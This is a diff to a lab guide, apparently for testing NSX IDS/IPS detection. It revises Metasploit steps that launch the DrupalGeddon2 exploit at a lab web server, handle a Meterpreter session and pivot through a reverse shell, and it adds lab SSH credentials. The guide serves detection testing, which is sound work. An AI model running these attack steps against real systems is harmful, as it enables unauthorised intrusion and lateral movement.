@@ -502,7 +502,8 @@ OS          : Linux 273e1700c5be 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21
 Meterpreter : php/linux
 meterpreter > ?
 ```
-7. When you are done, type exit -z to shut down the Meterpreter session
+7. When you are done, type **exit -z** to shut down the Meterpreter session
+8. Type **exit** to exit Metasploit
 
 **Confirm IDS/IPS Events show up in the NSX Manager UI**
 1.	In the NSX Manager UI, navigate to Security -->  Security Overview
@@ -530,13 +531,16 @@ You have now successfully completed a simple attack scenario ! In the next exerc
 ## Lateral Attack Scenario
 **Estimated Time to Complete: 30 minutes**
 
-In this exercise, we will use already established **reverse shell** from the Drupal servers as a **pivot** to gain access to the internal network which is not direclty accessible from the external VM. Traffic to the internal network will be routed through the established **reverse shell** from the **App1-WEB-TIER VM**. 
+In this exercise, we will again establish a **reverse shell** from the Drupal server, and use it as a **pivot** to gain access to the internal network which is not direclty accessible from the external VM. Traffic to the internal network will be routed through the established **reverse shell** from the **App1-WEB-TIER VM**. 
 
-In order to launch this attakc sequence, you can either manually configure the **Metasploit** modules, or edit and run a pre-defined script. If you want to go with the script option, skip to step #3 and continue from there. 
+**Open a SSH/Console session to the External VM**
+1.	If your computer has access to the IP address you've assigend to the **External VM** (10.114.209.151 in my example), open your ssh client and initiate a session to it. Login with the below credentials. 
+    * Username **vmware**
+    * Password **VMware1!**
+2. **Alternatively**, if your computer does not have access to the **External VM** directly, you can access the VM console from the  physical environment vCenter Web-UI. 
 
-**Initiate DrupalGeddon2 attack against App1-WEB-TIER VM (again)**
-1.	If you have previously existed the SSH or Console session, restart the SSH or Console session with the  **External VM** 
-2. If you have previously exited Metasploit, type **sudo msfconsole** to launch **Metasploit**. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
+**Initiate DrupalGeddon2 attack against the App1-WEB-TIER VM (again)**
+1.	Type **sudo msfconsole** to launch **Metasploit**. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
     * Type **use exploit/unix/webapp/drupal_drupalgeddon2** to select the drupalgeddon2 exploit module
     * Type **set RHOST 192.168.10.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**
     * Type **set RPORT 8080** to define the port the vulnerable Drupal service runs on. 
